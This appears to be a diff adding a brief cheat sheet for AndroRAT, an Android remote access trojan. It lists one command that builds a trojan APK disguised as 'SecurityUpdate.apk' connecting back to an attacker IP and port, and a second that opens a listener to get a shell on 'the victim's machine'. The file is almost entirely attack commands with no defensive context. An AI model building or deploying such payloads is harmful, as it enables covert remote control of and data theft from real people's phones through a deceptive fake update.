@@ -1,0 +1,12 @@
+AndroRAT * Linux
+
+# UseCase: 
+[To make a exploit for Android devices]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk [To Build Exploit]
+
+$ python3 androRAT.py --shell -i 0.0.0.0 -p 4444 [to start listening to the victim's machine]
+
+$ 
